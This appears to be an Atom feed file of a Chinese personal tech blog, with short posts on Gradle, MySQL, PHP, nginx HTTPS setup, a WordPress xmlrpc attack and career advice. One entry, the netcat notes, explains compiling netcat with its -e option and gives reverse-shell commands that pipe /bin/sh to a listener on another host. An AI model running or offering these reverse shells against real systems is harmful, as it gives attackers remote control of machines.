@@ -1,0 +1,611 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[shengsheng的博客]]></title>
+  <link href="shengsheng.net/atom.xml" rel="self"/>
+  <link href="shengsheng.net/"/>
+  <updated>2020-02-06T11:12:51+08:00</updated>
+  <id>shengsheng.net/</id>
+  <author>
+    <name><![CDATA[]]></name>
+    
+  </author>
+  <generator uri="http://www.mweb.im/">MWeb</generator>
+  
+  <entry>
+    <title type="html"><![CDATA[gradle读书笔记]]></title>
+    <link href="shengsheng.net/15809578628586.html"/>
+    <updated>2020-02-06T10:57:42+08:00</updated>
+    <id>shengsheng.net/15809578628586.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2019-09-03 19:46</p>
+
+<p>gradle读书笔记</p>
+
+<p>repositories代码块将JCenter配置成一个仓库，在这种情况下，一个仓库意味着一系列的依赖包，或者说，在我们应用和依赖项目中可使用的一系列可下载的函数库。JCenter是一个很有名的Maven库。</p>
+
+<p>dependencies代码块用于配置构建过程中的依赖包。这也意味着你不能将你的应用或依赖项目所需要的依赖包包含在顶层构建文件中。默认情况下，唯一被定义的依赖包是Gradle的Android插件。每个Android模块都需要有Android插件，因为该插件可使其执行Android相关的任务。</p>
+
+<p>只要你使用了allprojects，模块就会被耦合到项目。这意味着，其很可能在没有主项目构建文件的情况下，无法独立构建模块。最初，这看起来可能不是一个问题，但是如果你后面想要分离一个内部依赖库到自己的项目，那么你将需要重构你的构建文件。</p>
+
+<p>第一个，compileSdkVersion，是要用来编译应用的AndroidAPI版本。第二个，buildToolsVersion，是构建工具和编译器使用的版本号。</p>
+
+<p>assemble：集合项目的输出。clean：清理项目的输出。check：运行所有检查，通常是单元测试和集成测试。build：同时运行assemble和check。Java基础插件添加了源集的概念。Android插件构建于这些约定，这样经验丰富的Gradle用户就可以看到这些暴露的任务。在这些基本的任务之上，Android插件也添加了很多Android特有的任务。</p>
+
+<p>connectedCheck：在连接设备或模拟器上运行测试。deviceCheck：一个占位任务，专为其他插件在远端设备上运行测试。installDebug和installRelease：在连接的设备或模拟器上安装特定版本。所有的installtasks都会有相关的uninstall任务。</p>
+
+<p>在Gradle中，有一些便捷和可扩展的概念可用来定位这些常见问题。前面提到过，每个由AndroidStudio创建的新项目都会生成debug和release构建类型。另外一个概念是productflavor（不同定制的产品），其让管理多个应用或依赖库版本成为可能。构建类型和productflavor经常结合在一起使用，可以很容易地处理测试和生产应用的免费和付费版本。构建类型和productflavor的结合结果被称之为构建variant。</p>
+
+<p>android{buildTypes{release{minifyEnabledfalseproguardFilesgetDefaultProguardFile(&#39;proguardandroid.txt&#39;),&#39;proguardrules.pro&#39;}</p>
+
+<p>android{productFlavors{red{applicationId&#39;com.gradleforandroid.red&#39;versionCode3}blue{applicationId&#39;com.gradleforandroid.blue&#39;minSdkVersion14versionCode4}}}</p>
+
+<p>和构建类型类似，productflavor也可以拥有它们自己的源集目录。为一个特殊的flavor创建一个文件夹就和创建一个有flavor名称的文件夹一样简单。你甚至可以为一个特定构建类型和flavor的结合体创建一个文件夹。该文件夹的名称将是flavor名称＋构建类型的名称。例如，如果你想让blueflavor的release版本有一个不同的应用图标，那么文件夹将会被叫作blueRelease。合并文件夹的组成将比构建类型文件夹和productflavor文件夹拥有更高优先级。</p>
+
+<p>源集的引入额外增加了构建进程的复杂性。Gradle的Android插件在打包应用之前将main源集和构建类型源集合并在一起。此外，library项目也可以提供额外的资源，这些也需要被合并。这同样适用于manifest文件。例如，在你应用的debugvariant中可能需要额外的Android权限来存储log文件。你并不想在main源集中申明该权限，因为这会吓跑潜在客户。相反，你可以在debug构建类型的源集中额外添加一个manifest文件来申明额外的权限。</p>
+
+<p>签名配置：<br/>
+android{signingConfigs{staging.initWith(signingConfigs.debug)release{storeFilefile(&quot;release.keystore&quot;)storePassword&quot;secretpassword&quot;keyAlias&quot;gradleforandroid&quot;keyPassword&quot;secretpassword&quot;}}}</p>
+
+<p>这是建立多模块项目最简单、最直接的方式。在项目的settings.gradle文件中声明了所有的模块，如下所示：include&#39;:app&#39;,&#39;:library&#39;该代码确保了app和library模块包含在构建配置中。你需要做的就是添加模块的目录名。</p>
+
+<p>dependencies{compileproject(&#39;:library&#39;)}</p>
+
+<p>AppEngine插件添加了许多任务，其中使用最多的是appengineRun和appengineUpdate。appengineRun任务用来开启一个本地开发服务器，这样就可以在上传到GoogleAppEngine之前，本地测试整个后端。第一次运行该任务时，构建可能需要一段时间，因为Gradle需要下载AppEngineSDK。我们早已通过downloadSdk=true来设置下载行为。要想停止服务器，你可以使用appengineStop。</p>
+
+<p>Closures是匿名代码块，可以接受参数和返回值。它们可以被视为变量，被当作参数传递给方法。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[钟总公开课笔记。]]></title>
+    <link href="shengsheng.net/15809578629104.html"/>
+    <updated>2020-02-06T10:57:42+08:00</updated>
+    <id>shengsheng.net/15809578629104.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2017-08-28 03:26</p>
+
+<p>为什么要换工作？</p>
+
+<ul>
+<li>  没意思 心态上或没人聊天 ，不满意  薪水，升个职<br/></li>
+<li><br/></li>
+<li>  如果这公司发生的，可能到下家公司也会遇到！</li>
+<li><br/></li>
+<li>  最基础的开端其实是从心态开始</li>
+<li><br/></li>
+<li><p>结果，时间</p></li>
+<li><p>下份工作目标</p></li>
+<li><p>赚钱   钱在哪里？  大公司，创业？</p></li>
+<li><p>稳定   透过佛法看世界</p></li>
+<li></li>
+<li><p>两种公司，歌酒菜，画大饼</p></li>
+<li><p>歌酒菜，没情怀！</p></li>
+<li></li>
+<li><p>梦想是要靠现实来支撑的</p></li>
+<li></li>
+<li><p>歌酒菜</p></li>
+<li><p>抱X包类，贪便宜</p></li>
+<li><p>快速支付 </p></li>
+<li><p>健康养生</p></li>
+<li><p>成人用品</p></li>
+<li></li>
+<li><p>区块链ico     </p></li>
+<li><p>技术与操盘</p></li>
+<li></li>
+<li><p>情怀与梦想</p></li>
+<li><p>公司是可以赚快钱 企业要慢慢捱</p></li>
+<li><p>企业：战略与管理   </p></li>
+<li></li>
+<li><p>ppt 成果展示  </p></li>
+<li></li>
+<li><p>组织人才，其实要培训自己的团队</p></li>
+<li><p>招高管  你能帮我带多少人过来</p></li>
+<li><p>判断做事：1.效率  2.效益 </p></li>
+<li><p>功劳和苦劳</p></li>
+<li></li>
+<li><p>用对人，做对事</p></li>
+<li><p>自聪明人与机器人（自动化）！</p></li>
+<li><p>以技术的能力取代人工！以核心的数据分析！  算法部分</p></li>
+<li><p>流程产品化</p></li>
+<li><p>结果反馈机制</p></li>
+<li><p>数据，算法，协同  人工智能三要素</p></li>
+<li><p>挖掘需求，效率更高</p></li>
+<li><p>数据智能，数据化，算法化，智能化</p></li>
+<li></li>
+<li></li>
+<li><p>我作为一个投资人，我要看到一个企业横向和纵向的分析 </p></li>
+<li></li>
+<li><p>基础数据要进行分析 </p></li>
+<li></li>
+<li><p>谈判条件 </p></li>
+<li><p>你有什么优势，你能做什么，带来什么价值 </p></li>
+<li><p>你有什么要求，工资？ 要准备心态 </p></li>
+<li><p>有可能工作一年重踏旧路，我又不想干了</p></li>
+<li><p>志同道合 </p></li>
+<li><p>门当户对</p></li>
+<li><p>压力源于自身不足，动力源于自身实力</p></li>
+<li></li>
+<li></li>
+<li><p>别盲目选，给自己三天时间好好思考一下，选择自己所爱的，爱自己所选的</p></li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[mysql PARTITION表分区要注意事项]]></title>
+    <link href="shengsheng.net/15809578629394.html"/>
+    <updated>2020-02-06T10:57:42+08:00</updated>
+    <id>shengsheng.net/15809578629394.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2017-04-18 16:33</p>
+
+<p>把表进行分区，数据量有一定的时候，会减轻压力。</p>
+
+<p>1.主键，一定要使用复合主键。例如，主键为id, 复合字段就是 id,date</p>
+
+<p>2.按月进行分区，其它没区分出的，放在MAXVALUE</p>
+
+<p>3.写个shell crond,每个月设置一次。</p>
+
+<p>例:</p>
+
+<p>alter table day PARTITION by range(itime_d div 100)<br/>
+(<br/>
+partition day_2017_01 values less than (201701),<br/>
+partition day_2017_02 values less than (201702),<br/>
+partition day_2017_03 values less than (201703),<br/>
+PARTITION day_2017_04 VALUES less than MAXVALUE<br/>
+);</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[数据库区分大小写问题]]></title>
+    <link href="shengsheng.net/15809578629442.html"/>
+    <updated>2020-02-06T10:57:42+08:00</updated>
+    <id>shengsheng.net/15809578629442.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2017-04-12 02:10</p>
+
+<p>其实关于自己选择集有关</p>
+
+<p>例如列有:</p>
+
+<p>user</p>
+
+<p>gw</p>
+
+<p>GW</p>
+
+<p>查询时候group by user，只有GW</p>
+
+<p>ALTER TABLE table CHANGE COLUMN <code>user</code> <code>user</code> varchar(100) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL COMMENT &#39;名称&#39;;</p>
+
+<p>改变collate就会区分大小写的了</p>
+
+<p>设置collate（校对） 。 collate规则：</p>
+
+<p>*_bin: 表示的是binary case sensitive collation，也就是说是区分大小写的<br/>
+*_cs: case sensitive collation，区分大小写<br/>
+*_ci: case insensitive collation，不区分大小写</p>
+
+<p>对于只是单项查询区分，使用binary就可够了。 where user binary(&#39;gw&#39;);</p>
+
+<p>sql的一个例子：</p>
+
+<p>select user collate utf8_bin from table group by user collate utf8_bin;</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[小玩微信小程序]]></title>
+    <link href="shengsheng.net/15809578629495.html"/>
+    <updated>2020-02-06T10:57:42+08:00</updated>
+    <id>shengsheng.net/15809578629495.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2017-04-05 14:54</p>
+
+<p>上周玩了两三晚微信小程序，开发了一个简单事例：</p>
+
+<p>官方文档：<a href="https://mp.weixin.qq.com/debug/wxadoc/dev/index.html?t=2017327">https://mp.weixin.qq.com/debug/wxadoc/dev/index.html?t=2017327</a></p>
+
+<p>首先当然是注册一个小程序的号，然后下载个小程序微信开发。</p>
+
+<p>小程序里面提供了一套mvc的架构，按照架构就可以开发了，很容易理解。</p>
+
+<p>值得注意的是页面是使用html+css..但js未必是jquery的，里面提供了一套api.</p>
+
+<p>例如发起请求：wx.request(OBJECT)<br/>
+<pre><code class="lang-javascript">wx.request({<br/>
+  url: <span class="hljs-string">&#39;test.php&#39;</span>, <span class="hljs-comment">//仅为示例，并非真实的接口地址</span><br/>
+  data: {<br/>
+     x: <span class="hljs-string">&#39;&#39;</span> ,<br/>
+     y: <span class="hljs-string">&#39;&#39;</span><br/>
+  },<br/>
+  header: {<br/>
+      <span class="hljs-string">&#39;content-type&#39;</span>: <span class="hljs-string">&#39;application/json&#39;</span><br/>
+  },<br/>
+  success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>) </span>{<br/>
+    <span class="hljs-built_in">console</span>.log(res.data)<br/>
+  }<br/>
+})<br/>
+</code></pre><br/>
+但和服务端通通一定要使用https,这里硬规定，现在的app很多都走https了，更安全吧。</p>
+
+<p>使用https,避免明文被窃听。</p>
+
+<p>申请好https之后，如果是nginx,加多一个server即可， 不影响之前的配置。</p>
+
+<p>server {<br/>
+listen 443;<br/>
+server_name <a href="http://www.anyway.cn">www.anyway.cn</a>;</p>
+
+<p>//https开启<br/>
+ssl on;<br/>
+ssl_certificate /ddd/cert/1_<a href="http://www.anyway.cn_bundle.crt">www.anyway.cn_bundle.crt</a>;<br/>
+ssl_certificate_key /ddd/cert/2_<a href="http://www.anyway.cn.key">www.anyway.cn.key</a>;<br/>
+ssl_session_timeout 5m;<br/>
+ssl_protocols TLSv1 TLSv1.1 TLSv1.2;<br/>
+ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;<br/>
+ssl_prefer_server_ciphers on;</p>
+
+<p>}</p>
+
+<p>审核大概两天的时间就差不多了，但是提交的版本，你发了最新版本，也只能按提交时候的版本来审核。</p>
+
+<p>现在看了一下统计，每也也有一些用户递增，那就足够了，有兴趣，可以添加『手机归属地』体验一下。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[博客暂停访问原因]]></title>
+    <link href="shengsheng.net/15809578629750.html"/>
+    <updated>2020-02-06T10:57:42+08:00</updated>
+    <id>shengsheng.net/15809578629750.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2017-01-21 02:20</p>
+
+<p>最近被攻击，导致停机几天，主要wordpress的xmlrpc.php被一直访问。</p>
+
+<p>一早以为是腾讯云坑了。具体排查了一下，发现是php-fpm进程卡住了。</p>
+
+<p>[21-Jan-2017 08:27:39] [pool www] pid 5966<br/>
+script_filename = /data/wwwroot/default/xmlrpc.php<br/>
+[0x00007efddb412c20] curl_exec() /data/wwwroot/default/wp-includes/Requests/Transport/cURL.php:162<br/>
+[0x00007efddb412b50] request() /data/wwwroot/default/wp-includes/class-requests.php:379<br/>
+[0x00007efddb412a40] request() /data/wwwroot/default/wp-includes/class-http.php:365<br/>
+[0x00007efddb4128a0] request() /data/wwwroot/default/wp-includes/class-http.php:590<br/>
+[0x00007efddb4127e0] get() /data/wwwroot/default/wp-includes/http.php:70<br/>
+[0x00007efddb412730] wp_safe_remote_get() /data/wwwroot/default/wp-includes/class-wp-xmlrpc-server.php:6303<br/>
+[0x00007efddb412480] pingback_ping() /data/wwwroot/default/wp-includes/IXR/class-IXR-server.php:115<br/>
+[0x00007efddb4123a0] call() /data/wwwroot/default/wp-includes/IXR/class-IXR-server.php:65<br/>
+[0x00007efddb4122b0] serve() /data/wwwroot/default/wp-includes/IXR/class-IXR-server.php:27<br/>
+[0x00007efddb412210] __construct() /data/wwwroot/default/wp-includes/IXR/class-IXR-server.php:35<br/>
+[0x00007efddb412170] IXR_Server() /data/wwwroot/default/wp-includes/class-wp-xmlrpc-server.php:206<br/>
+[0x00007efddb412100] serve_request() /data/wwwroot/default/xmlrpc.php:84</p>
+
+<p>自己暴网站文件地址真的好么？哈哈。。。。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[mac下设置内置键盘失效]]></title>
+    <link href="shengsheng.net/15809578630162.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578630162.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2016-01-21 08:54</p>
+
+<p>使用hhkb，想禁用内置键盘</p>
+
+<p>辅助与设置-》启用鼠标键-》设置连按5下option启用即可</p>
+
+<p>不过delte键和f1那些是不禁用的。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[今天工作遇到的小问题总结]]></title>
+    <link href="shengsheng.net/15809578630724.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578630724.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-11-18 19:21</p>
+
+<p>InnoDB: Unable to lock ./ibdata1, error: 11<br/>
+InnoDB: Check that you do not already have another mysqld process<br/>
+InnoDB: using the same InnoDB data or log files.<br/>
+不使用/etc/init.d/mysql restart<br/>
+使用service mysql restart 即可</p>
+
+<p>setcookie 如果时间设置为0,即session就过期</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[hhkb体验]]></title>
+    <link href="shengsheng.net/15809578630972.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578630972.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-11-06 09:58</p>
+
+<p>hhkb跳线相关<br/>
+011001</p>
+
+<p>开启mac模式，6是多媒体相关</p>
+
+<p>锁屏<br/>
+fn + ctrl + shift + esc</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[mysql update不了原因]]></title>
+    <link href="shengsheng.net/15809578631013.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578631013.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-11-05 11:25</p>
+
+<p>update bone_m_element set thumb=CONCAT(thumb,&#39;dia.jpg&#39;) where thumb like &#39;%gju%&#39;</p>
+
+<p>update不了的原因是 char(100) 不够长，改为 char(200)即可</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[if empty打错字的后果。]]></title>
+    <link href="shengsheng.net/15809578631093.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578631093.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-11-03 14:04</p>
+
+<p>打错字：<br/>
+if(empty(\(a &amp;&amp; empty(\)b))<br/>
+{</p>
+
+<p>}<br/>
+//不符合条件也是对的<br/>
+正确的话：<br/>
+if(empty(\(a) &amp;&amp; empty(\)b))<br/>
+{</p>
+
+<p>}</p>
+
+<p>// \(b = &quot;123&quot;;<br/>
+// \)c = &quot;567&quot;;<br/>
+// \(a = empty(\)b &amp;&amp; false);<br/>
+// var_dump($a);exit();</p>
+
+<p>// if( false &amp;&amp; false)<br/>
+// {<br/>
+//     echo &#39;ok&#39;;exit();<br/>
+// }else{<br/>
+//     echo &#39;no&#39;;exit();<br/>
+// }</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[mysql的一些小问题]]></title>
+    <link href="shengsheng.net/15809578631182.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578631182.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-10-31 09:29</p>
+
+<p>直接mysqld启动没socket，<br/>
+有时为了方便直接使用mysqld,但socket文件没创建，要保证运行顺畅，还是使用mysqld_safe启动。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[淘宝客链接转换]]></title>
+    <link href="shengsheng.net/15809578631365.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578631365.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-10-23 15:43</p>
+
+<p>工作需要，转换淘宝链接</p>
+
+<pre><code class="language-$header">$refer =  $header[&#39;Location&#39;];
+
+$tu = explode(&quot;tu=&quot;,$refer);
+$tu = $tu[&#39;1&#39;];
+$url = urldecode($tu);
+
+$user_agent = &#39;Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-CN; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13&#39;;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+curl_setopt($ch, CURLOPT_REFERER, $refer);
+curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+   
+$result = curl_exec($ch);
+$errno  = curl_errno($ch);
+$infos = curl_getinfo($ch); 
+    
+curl_close($ch);
+$h = $infos[&#39;redirect_url&#39;];
+echo $h; //淘宝链接
+</code></pre>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[php static extends]]></title>
+    <link href="shengsheng.net/15809578632176.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578632176.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-09-09 11:06</p>
+
+<p>工作上遇到的问题：<br/>
+class a{public static \(a=&#39;1&#39;;public static function a(){echo self::\)a}<br/>
+class b exntends a{public static $a=&#39;2&#39;}</p>
+
+<p>b::a();<br/>
+输出是1,<br/>
+原因在parent self,静态方法要使用static<br/>
+把class a的self改为static即可</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[mac dash]]></title>
+    <link href="shengsheng.net/15809578632450.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578632450.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-09-01 08:34</p>
+
+<p>最近买了款软件dash..</p>
+
+<p>内置购买用了128.。</p>
+
+<p>感觉体验不错。查询十分方便。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[tabs切换]]></title>
+    <link href="shengsheng.net/15809578632578.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578632578.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-08-24 08:39</p>
+
+<p>onfocus onblur</p>
+
+<p>获得 失去焦点</p>
+
+<pre><code class="language-text">function $(ID){return document.getElementById(ID)}function showTab(ID){for(var i=1;i&amp;lt;4;i++){if(ID==i){$(&#39;tab&#39;+i).blur();$(&quot;tab&quot;+i).className=&quot;on&quot;;$(&quot;cont&quot;+i).style.display=&quot;block&quot;;}else{$(&quot;tab&quot;+i).className=&quot;off&quot;;$(&quot;cont&quot;+i).style.display=&quot;none&quot;;}}return false;}
+</code></pre>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[python中的*]]></title>
+    <link href="shengsheng.net/15809578633253.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578633253.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-08-21 09:09</p>
+
+<p>非关键字可变长参数（元组）  *<br/>
+关键字变量参数（字典）  **</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[js在线格式化]]></title>
+    <link href="shengsheng.net/15809578633339.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578633339.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-08-21 14:21</p>
+
+<p>国外的在线格式化会比国内的好用，</p>
+
+<p>用很很多在线的JS,CSS格式化工具，例如：chinaz的。</p>
+
+<p>但JS格式化，不完整，会有报错。。。</p>
+
+<p>谷歌一下，找到一款<a href="http://jsbeautifier.org/%EF%BC%8C%E6%84%9F%E8%A7%89%E4%B8%8D%E9%94%99%EF%BC%8C%E5%88%86%E4%BA%AB%E7%BB%99%E5%A4%A7%E5%AE%B6">http://jsbeautifier.org/，感觉不错，分享给大家</a></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[NetCat笔记]]></title>
+    <link href="shengsheng.net/15809578634347.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578634347.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-08-18 21:38</p>
+
+<p>老实说黑客技术，不宜研究太深。但有机会将黑客技术用于正途，还是一件大好事。正所谓技术没有正邪，只是看使用的人。<br/>
+另外反向穿透太强大了。</p>
+
+<p>开启反向代理，需要修改netcat原代码，并进行重新编译。<br/>
+修改netcat.c<br/>
+如何想编译出 -e 和 -t 选项， 只要加上两条define 语句即可。</p>
+
+<h1 id="toc_0">define GAPING_SECURITY_HOLE</h1>
+
+<h1 id="toc_1">define TELNET</h1>
+
+<p>使用反向代理：</p>
+
+<p>输入输出分开<br/>
+服务端<br/>
+./netcat -vv -l -p 1221<br/>
+./netcat -vv -l -p 1222<br/>
+客户端<br/>
+./netcat 192.168.1.101 1221 | /bin/sh |nc 192.168.1.101 1222</p>
+
+<p>输入输出相同<br/>
+服务端<br/>
+./netcat -vv -l -p 1222<br/>
+客户端<br/>
+./netcat -e /bin/sh 192.168.1.101 1222</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[docker vagrant页面错误解决]]></title>
+    <link href="shengsheng.net/15809578635146.html"/>
+    <updated>2020-02-06T10:57:43+08:00</updated>
+    <id>shengsheng.net/15809578635146.html</id>
+    <content type="html"><![CDATA[
+<p>date: 2015-08-17 21:27</p>
+
+<p>之前提到说通过Vagrant部署开发环境，使用目录共享模式，在本地磁盘进行开发，而通过虚拟机环境运行开发的页面。</p>
+
+<p>是的，一切看起来都是那么的顺利，首先基于VirtualBox安装了Vagrant，接下来，按照以往部署环境的习惯，在VM中安装了nginx作为开发运行环境，并且将本地的共享目录作为nginx的web目录，然后打开页面，看上去似乎都很正常，但接下来，你发现了一个神奇的事情，你修改替换了一个css，一张图片，然后刷新浏览器，发现什么都没有变，然后你有非常猛烈、使劲的F5，依旧还是没有改变，是的，你看看编辑器，似乎替换是正常的，在看看VM上的文件，也都是对的，是的，尝试重启nginx，依旧没有任何变化，你开始怀疑php5-fpm甚至于毫不相干的memcached和mysql，但都无济于事。也不知道是什么让这些文件被“缓存”了呢。</p>
+
+<p>当你尝试修改一个js，并且用同样的方法更新之后，会遇到类似的问题，是的，就算重启VM上任何服务，甚至重启VM，依旧没有用，当然，比起其他资源文件，浏览器的反应会强烈一些，因为浏览器会提示未知错误，而你通过浏览器查看你修改的JS文件，会看到文件尾巴有下面奇怪的随机字符：</p>
+
+<p>�����������������</p>
+
+<p>这到底是什么东西呢？编码错误？缓存异常？又或是其他什么？</p>
+
+<p>是的，你尝试花费很多时间，试验各种各样的方法去解决这个问题，其实对于nginx来说，你只需要修改配置文件(nginx.conf)中的一行重启就能简单的解决这个问题：</p>
+
+<p>sendfile off;<br/>
+找到 nginx.conf ，把里面的 “sendfile on” 修改为 “sendfile off”。</p>
+
+<p>当然，如果你使用Apache也可能遇到类似的问题，那么同样也有类似的配置需要修改：</p>
+
+<p>EnableSendfile off</p>
+
+<p>＝＝＝＝＝<br/>
+<a href="http://stackoverflow.com/questions/9479117/vagrant-virtualbox-apache2-strange-cache-behaviour">http://stackoverflow.com/questions/9479117/vagrant-virtualbox-apache2-strange-cache-behaviour</a></p>
+
+]]></content>
+  </entry>
+  
+</feed>
